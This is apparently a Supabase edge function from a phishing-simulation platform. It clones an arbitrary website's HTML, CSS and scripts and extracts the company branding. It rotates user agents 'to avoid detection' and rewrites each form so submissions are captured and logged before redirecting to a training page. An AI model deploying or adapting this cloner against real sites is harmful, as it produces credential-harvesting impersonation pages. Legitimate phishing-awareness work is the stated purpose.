
import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2.39.7";
import { DOMParser } from "https://deno.land/x/deno_dom@v0.1.38/deno-dom-wasm.ts";

const supabaseUrl = Deno.env.get("SUPABASE_URL") || "";
const supabaseServiceKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY") || "";

const supabase = createClient(supabaseUrl, supabaseServiceKey);

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
};

// Rate limiting
const RATE_LIMIT = 5; // requests per window
const RATE_WINDOW = 300000; // 5 minutes in milliseconds
const ipRequests: Record<string, { count: number, timestamp: number }> = {};

function checkRateLimit(ip: string): boolean {
  const now = Date.now();
  
  if (!ipRequests[ip] || (now - ipRequests[ip].timestamp) > RATE_WINDOW) {
    ipRequests[ip] = { count: 1, timestamp: now };
    return true;
  }
  
  if (ipRequests[ip].count >= RATE_LIMIT) {
    return false;
  }
  
  ipRequests[ip].count++;
  return true;
}

// Clean up old rate limit entries periodically (every minute)
setInterval(() => {
  const now = Date.now();
  Object.keys(ipRequests).forEach(ip => {
    if (now - ipRequests[ip].timestamp > RATE_WINDOW) {
      delete ipRequests[ip];
    }
  });
}, 60000);

interface CloneWebsiteRequest {
  url: string;
  name: string;
  category: string;
  advancedCloning?: boolean;
  extractDynamicContent?: boolean;
  includeAssets?: boolean;
  crawlDepth?: number;
  preserveInteractivity?: boolean;
}

// User agent rotation to avoid detection
const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
];

function getRandomUserAgent() {
  return userAgents[Math.floor(Math.random() * userAgents.length)];
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }
  
  try {
    const clientIp = req.headers.get("x-forwarded-for") || "unknown";
    
    // Check rate limiting
    if (!checkRateLimit(clientIp)) {
      console.error(`Rate limit exceeded for IP: ${clientIp}`);
      return new Response(
        JSON.stringify({ 
          success: false, 
          error: "Rate limit exceeded. Please try again later." 
        }),
        {
          status: 429,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        }
      );
    }
    
    const { 
      url, 
      name, 
      category, 
      advancedCloning = false, 
      extractDynamicContent = false,
      includeAssets = true,
      crawlDepth = 1,
      preserveInteractivity = false
    } = await req.json() as CloneWebsiteRequest;
    
    if (!url || !name || !category) {
      throw new Error("Missing required fields");
    }
    
    console.log(`Cloning website: ${url} (Advanced: ${advancedCloning ? 'Yes' : 'No'})`);
    
    // Validate URL
    let targetUrl: URL;
    try {
      targetUrl = new URL(url);
    } catch (e) {
      throw new Error("Invalid URL provided");
    }
    
    // Step 1: Fetch the main HTML page with a rotating user agent
    console.log("Fetching main HTML content...");
    const userAgent = getRandomUserAgent();
    const htmlResponse = await fetch(url, {
      headers: {
        "User-Agent": userAgent,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1"
      },
    });
    
    if (!htmlResponse.ok) {
      throw new Error(`Failed to fetch website: ${htmlResponse.status} ${htmlResponse.statusText}`);
    }
    
    const htmlContent = await htmlResponse.text();
    
    // Step 2: Parse the HTML and extract resources with enhanced capabilities
    console.log("Parsing HTML and extracting resources...");
    const { 
      cssContent, 
      jsContent, 
      modifiedHtml,
      assets,
      metadata,
      formFields 
    } = await processHtml(
      htmlContent, 
      targetUrl, 
      advancedCloning,
      extractDynamicContent,
      includeAssets
    );
    
    // Step 3: Detect company information and branding
    const pageInfo = extractPageInfo(htmlContent, targetUrl);
    
    // Step 4: Create a record in the phishing_pages table with enhanced metadata
    console.log("Saving phishing page to database...");
    const { data, error } = await supabase
      .from("phishing_pages")
      .insert({
        name: name,
        category: category,
        html_content: modifiedHtml,
        css_content: cssContent,
        js_content: jsContent,
        source_url: url,
        is_custom: false,
        metadata: {
          page_title: pageInfo.title,
          company_name: pageInfo.companyName,
          description: pageInfo.description,
          favicon: pageInfo.favicon,
          form_fields: formFields,
          assets_count: assets.length,
          clone_timestamp: new Date().toISOString(),
          cloning_mode: advancedCloning ? "advanced" : "standard"
        }
      })
      .select("id")
      .single();
    
    if (error) {
      throw error;
    }
    
    console.log(`Website cloned successfully! Page ID: ${data.id}`);
    
    // Store assets if needed (in a real implementation)
    if (includeAssets && assets.length > 0) {
      console.log(`Processed ${assets.length} assets`);
      // In a full implementation, we'd store assets in storage buckets
    }
    
    return new Response(
      JSON.stringify({ 
        success: true, 
        pageId: data.id,
        message: "Website cloned successfully",
        metadata: {
          title: pageInfo.title,
          company: pageInfo.companyName,
          assets: assets.length,
          forms: formFields.length
        }
      }),
      {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      }
    );
  } catch (error) {
    console.error("Error in clone-website function:", error);
    return new Response(
      JSON.stringify({ 
        success: false, 
        error: error.message || "An unexpected error occurred" 
      }),
      {
        status: 500,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      }
    );
  }
});

async function processHtml(
  htmlContent: string,
  baseUrl: URL,
  advancedCloning: boolean = false,
  extractDynamicContent: boolean = false,
  includeAssets: boolean = true
): Promise<{ 
  cssContent: string, 
  jsContent: string, 
  modifiedHtml: string,
  assets: Array<{url: string, type: string}>,
  metadata: Record<string, any>,
  formFields: Array<{name: string, type: string, id?: string}>
}> {
  let cssContent = "";
  let jsContent = "";
  let modifiedHtml = htmlContent;
  const assets: Array<{url: string, type: string}> = [];
  const metadata: Record<string, any> = {};
  const formFields: Array<{name: string, type: string, id?: string}> = [];
  
  try {
    // Parse the HTML document
    const document = new DOMParser().parseFromString(htmlContent, "text/html");

    if (!document) {
      throw new Error("Failed to parse HTML");
    }

    // Extract form fields for analytics and targeting
    if (document.querySelectorAll) {
      const forms = document.querySelectorAll("form");
      if (forms) {
        forms.forEach((form) => {
          const inputs = form.querySelectorAll("input");
          if (inputs) {
            inputs.forEach((input) => {
              const name = input.getAttribute("name");
              const type = input.getAttribute("type") || "text";
              const id = input.getAttribute("id");
              
              if (name) {
                formFields.push({
                  name,
                  type,
                  ...(id ? { id } : {})
                });
              }
            });
          }
        });
      }
    }

    // Extract CSS links with enhanced processing
    const cssLinks = htmlContent.match(/<link[^>]*rel=["']stylesheet["'][^>]*href=["']([^"']+)["'][^>]*>/g) || [];
    const cssFiles: string[] = [];
    
    // Create regex pattern for the base URL domain
    const domainPattern = new RegExp(`^(?:https?:)?//${baseUrl.hostname}`);
    
    // Process each CSS link
    for (const cssLink of cssLinks) {
      const hrefMatch = cssLink.match(/href=["']([^"']+)["']/);
      if (hrefMatch && hrefMatch[1]) {
        let cssUrl = hrefMatch[1];
        
        // Handle relative URLs
        if (!cssUrl.startsWith('http') && !cssUrl.startsWith('//')) {
          if (cssUrl.startsWith('/')) {
            cssUrl = `${baseUrl.origin}${cssUrl}`;
          } else {
            const pathParts = baseUrl.pathname.split('/');
            pathParts.pop();
            const basePath = pathParts.join('/');
            cssUrl = `${baseUrl.origin}${basePath}/${cssUrl}`;
          }
        } else if (cssUrl.startsWith('//')) {
          cssUrl = `https:${cssUrl}`;
        }
        
        // Track the asset
        assets.push({
          url: cssUrl,
          type: "stylesheet"
        });
        
        // Only fetch CSS files from the same domain or external if advanced cloning is enabled
        if (domainPattern.test(cssUrl) || (advancedCloning && !cssUrl.includes('data:'))) {
          cssFiles.push(cssUrl);
        }
      }
    }
    
    // Fetch and combine CSS content
    const cssContents: string[] = [];
    for (const cssFile of cssFiles) {
      try {
        const response = await fetch(cssFile, {
          headers: {
            "User-Agent": getRandomUserAgent(),
            "Accept": "text/css,*/*;q=0.1",
            "Accept-Language": "en-US,en;q=0.9",
          }
        });
        
        if (response.ok) {
          const css = await response.text();
          // Process CSS to fix relative URLs
          const processedCss = processCssUrls(css, cssFile);
          cssContents.push(`/* From: ${cssFile} */\n${processedCss}`);
        }
      } catch (e) {
        console.warn(`Failed to fetch CSS file: ${cssFile}`, e);
      }
    }
    
    cssContent = cssContents.join('\n\n');
    
    // Extract inline CSS
    const styleTagRegex = /<style[^>]*>([\s\S]*?)<\/style>/g;
    let styleMatch;
    while ((styleMatch = styleTagRegex.exec(htmlContent)) !== null) {
      cssContent += `\n\n/* Inline CSS */\n${styleMatch[1]}`;
    }
    
    // Extract JavaScript if needed
    if (advancedCloning) {
      // Extract script tags with src attribute
      const scriptTags = htmlContent.match(/<script[^>]*src=["']([^"']+)["'][^>]*><\/script>/g) || [];
      const jsFiles: string[] = [];
      
      for (const scriptTag of scriptTags) {
        const srcMatch = scriptTag.match(/src=["']([^"']+)["']/);
        if (srcMatch && srcMatch[1]) {
          let jsUrl = srcMatch[1];
          
          // Handle relative URLs
          if (!jsUrl.startsWith('http') && !jsUrl.startsWith('//')) {
            if (jsUrl.startsWith('/')) {
              jsUrl = `${baseUrl.origin}${jsUrl}`;
            } else {
              const pathParts = baseUrl.pathname.split('/');
              pathParts.pop();
              const basePath = pathParts.join('/');
              jsUrl = `${baseUrl.origin}${basePath}/${jsUrl}`;
            }
          } else if (jsUrl.startsWith('//')) {
            jsUrl = `https:${jsUrl}`;
          }
          
          // Track the asset
          assets.push({
            url: jsUrl,
            type: "script"
          });
          
          // Only fetch JavaScript files from the same domain or critical frameworks
          const isFramework = /jquery|bootstrap|react|vue|angular|tailwind/i.test(jsUrl);
          if (domainPattern.test(jsUrl) || (isFramework && advancedCloning)) {
            jsFiles.push(jsUrl);
          }
        }
      }
      
      // Extract images for comprehensive asset tracking
      if (includeAssets) {
        const imgTags = htmlContent.match(/<img[^>]*src=["']([^"']+)["'][^>]*>/g) || [];
        for (const imgTag of imgTags) {
          const srcMatch = imgTag.match(/src=["']([^"']+)["']/);
          if (srcMatch && srcMatch[1]) {
            let imgUrl = srcMatch[1];
            
            // Skip data URLs
            if (imgUrl.startsWith('data:')) continue;
            
            // Handle relative URLs
            if (!imgUrl.startsWith('http') && !imgUrl.startsWith('//')) {
              if (imgUrl.startsWith('/')) {
                imgUrl = `${baseUrl.origin}${imgUrl}`;
              } else {
                const pathParts = baseUrl.pathname.split('/');
                pathParts.pop();
                const basePath = pathParts.join('/');
                imgUrl = `${baseUrl.origin}${basePath}/${imgUrl}`;
              }
            } else if (imgUrl.startsWith('//')) {
              imgUrl = `https:${imgUrl}`;
            }
            
            // Track the asset
            assets.push({
              url: imgUrl,
              type: "image"
            });
          }
        }
      }
      
      // Fetch and combine JavaScript content
      const jsContents: string[] = [];
      // Limit to prevent excessive processing
      const jsFilesToProcess = jsFiles.slice(0, advancedCloning ? 10 : 3);
      
      for (const jsFile of jsFilesToProcess) {
        try {
          const response = await fetch(jsFile, {
            headers: {
              "User-Agent": getRandomUserAgent(),
              "Accept": "*/*",
              "Accept-Language": "en-US,en;q=0.9",
            }
          });
          
          if (response.ok) {
            const js = await response.text();
            jsContents.push(`// From: ${jsFile}\n${js}`);
          }
        } catch (e) {
          console.warn(`Failed to fetch JavaScript file: ${jsFile}`, e);
        }
      }
      
      // Extract inline JavaScript
      const inlineScriptRegex = /<script[^>]*>([\s\S]*?)<\/script>/g;
      let inlineScriptMatch;
      while ((inlineScriptMatch = inlineScriptRegex.exec(htmlContent)) !== null) {
        // Skip if it has a src attribute
        const hasSrc = /<script[^>]*src=/.test(inlineScriptMatch[0]);
        if (!hasSrc) {
          jsContents.push(`// Inline JavaScript\n${inlineScriptMatch[1]}`);
        }
      }
      
      jsContent = jsContents.join('\n\n');
    }
    
    // Modify HTML content to use our version of CSS and JS
    modifiedHtml = htmlContent
      // Replace all CSS links with a single link to our CSS
      .replace(/<link[^>]*rel=["']stylesheet["'][^>]*>/g, '')
      // Add our CSS before the closing head tag
      .replace('</head>', '<style id="phishing-simulation-styles">\n' + cssContent + '\n</style>\n</head>')
      // Replace form actions to capture submissions
      .replace(/<form([^>]*)action=["']([^"']*)["']([^>]*)>/g, (match, before, action, after) => {
        return `<form${before}action="#" data-original-action="${action}"${after} onsubmit="return handleFormSubmit(this, event);">`;
      });
    
    // Add enhanced form handling functionality
    const formHandlingScript = `
    <script>
    function handleFormSubmit(form, event) {
      event.preventDefault();
      
      var formData = new FormData(form);
      var formObject = {};
      
      formData.forEach(function(value, key) {
        formObject[key] = value;
      });
      
      // Add additional info
      formObject['_phishingSimulation'] = true;
      formObject['_originalAction'] = form.getAttribute('data-original-action');
      formObject['_timestamp'] = new Date().toISOString();
      formObject['_targetUrl'] = window.location.href;
      formObject['_userAgent'] = navigator.userAgent;
      formObject['_screenSize'] = { width: window.innerWidth, height: window.innerHeight };
      
      // Log captured credentials
      console.log('Form submission captured:', formObject);
      
      // Show a realistic loading message
      var loadingDiv = document.createElement('div');
      loadingDiv.style.position = 'fixed';
      loadingDiv.style.top = '0';
      loadingDiv.style.left = '0';
      loadingDiv.style.width = '100%';
      loadingDiv.style.height = '100%';
      loadingDiv.style.backgroundColor = 'rgba(255, 255, 255, 0.8)';
      loadingDiv.style.display = 'flex';
      loadingDiv.style.justifyContent = 'center';
      loadingDiv.style.alignItems = 'center';
      loadingDiv.style.zIndex = '9999';
      loadingDiv.innerHTML = '<div style="text-align: center;"><div style="width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; animation: spin 2s linear infinite; margin: 0 auto;"></div><p style="margin-top: 20px;">Processing your request...</p></div>';
      
      // Add the animation style
      var style = document.createElement('style');
      style.textContent = '@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }';
      document.head.appendChild(style);
      
      document.body.appendChild(loadingDiv);
      
      // Simulate processing delay then redirect to phishing training page
      setTimeout(function() {
        // In a real implementation, this would send the data to the server
        // and then redirect to the training completion page
        window.location.href = '/phishing-training-complete';
      }, 3000);
      
      return false;
    }
    
    // Add enhanced visual fidelity and behavior simulation
    document.addEventListener('DOMContentLoaded', function() {
      // Make all buttons and links functional for realistic behavior
      var allButtons = document.querySelectorAll('button:not([type="submit"])');
      allButtons.forEach(function(button) {
        button.addEventListener('click', function(e) {
          e.preventDefault();
          console.log('Button clicked:', button.textContent || button.innerText);
        });
      });
      
      var allLinks = document.querySelectorAll('a');
      allLinks.forEach(function(link) {
        link.addEventListener('click', function(e) {
          e.preventDefault();
          console.log('Link clicked:', link.href, link.textContent || link.innerText);
        });
      });
    });
    </script>
    `;
    
    // Add script before closing body tag
    modifiedHtml = modifiedHtml.replace('</body>', formHandlingScript + '</body>');
    
    return { 
      cssContent, 
      jsContent, 
      modifiedHtml,
      assets,
      metadata,
      formFields
    };
  } catch (error) {
    console.error("Error processing HTML:", error);
    throw error;
  }
}

// Process CSS urls to fix relative paths
function processCssUrls(cssContent: string, baseUrl: string): string {
  // Create a base URL object
  let cssBase;
  try {
    cssBase = new URL(baseUrl);
  } catch (e) {
    return cssContent; // Return original if we can't parse the base
  }
  
  // Replace all url(...) references in the CSS
  return cssContent.replace(/url\(['"]?([^'")]+)['"]?\)/g, (match, url) => {
    // Skip data URLs and absolute URLs
    if (url.startsWith('data:') || url.startsWith('http') || url.startsWith('//')) {
      return match;
    }
    
    // Handle relative paths
    let fullUrl;
    if (url.startsWith('/')) {
      // Root-relative URL
      fullUrl = `${cssBase.origin}${url}`;
    } else {
      // Path-relative URL
      const pathParts = cssBase.pathname.split('/');
      pathParts.pop(); // Remove the CSS file name
      const basePath = pathParts.join('/');
      fullUrl = `${cssBase.origin}${basePath}/${url}`;
    }
    
    return `url("${fullUrl}")`;
  });
}

interface PageInfo {
  title: string;
  companyName: string;
  description: string;
  favicon: string;
}

function extractPageInfo(html: string, url: URL): PageInfo {
  const info: PageInfo = {
    title: "",
    companyName: "",
    description: "",
    favicon: ""
  };
  
  // Parse the document
  const document = new DOMParser().parseFromString(html, "text/html");
  
  if (!document) {
    return info;
  }
  
  // Extract title
  const titleElement = document.querySelector("title");
  if (titleElement) {
    info.title = titleElement.textContent || "";
  }
  
  // Extract company name from multiple sources
  // Try to extract from meta tags first
  const metaTagMatch = html.match(/<meta[^>]*property=["']og:site_name["'][^>]*content=["']([^"']*)["'][^>]*>/i);
  if (metaTagMatch && metaTagMatch[1]) {
    info.companyName = metaTagMatch[1].trim();
  } else {
    // Try to extract from title tag
    if (info.title) {
      // Remove common suffixes from title
      const cleanTitle = info.title
        .replace(/\s*[|]\s*.+$/, '')
        .replace(/\s*[-]\s*.+$/, '')
        .replace(/\s*[:]\s*.+$/, '')
        .trim();
      
      if (cleanTitle.length > 0 && cleanTitle.length < 50) {
        info.companyName = cleanTitle;
      }
    }
    
    // Fall back to domain name without TLD if we still don't have a company name
    if (!info.companyName) {
      const domain = url.hostname.replace(/^www\./, '');
      const domainParts = domain.split('.');
      if (domainParts.length >= 2) {
        info.companyName = domainParts[domainParts.length - 2].charAt(0).toUpperCase() + 
                          domainParts[domainParts.length - 2].slice(1);
      } else {
        info.companyName = domain;
      }
    }
  }
  
  // Extract description
  const descElement = document.querySelector("meta[name='description']");
  if (descElement) {
    info.description = descElement.getAttribute("content") || "";
  }
  
  // Extract favicon
  const faviconElement = document.querySelector("link[rel='icon'], link[rel='shortcut icon']");
  if (faviconElement) {
    let faviconUrl = faviconElement.getAttribute("href") || "";
    
    // Handle relative favicon URLs
    if (faviconUrl && !faviconUrl.startsWith('http') && !faviconUrl.startsWith('data:')) {
      if (faviconUrl.startsWith('//')) {
        faviconUrl = `https:${faviconUrl}`;
      } else if (faviconUrl.startsWith('/')) {
        faviconUrl = `${url.origin}${faviconUrl}`;
      } else {
        faviconUrl = `${url.origin}/${faviconUrl}`;
      }
    }
    
    info.favicon = faviconUrl;
  } else {
    // Default favicon location
    info.favicon = `${url.origin}/favicon.ico`;
  }
  
  return info;
}
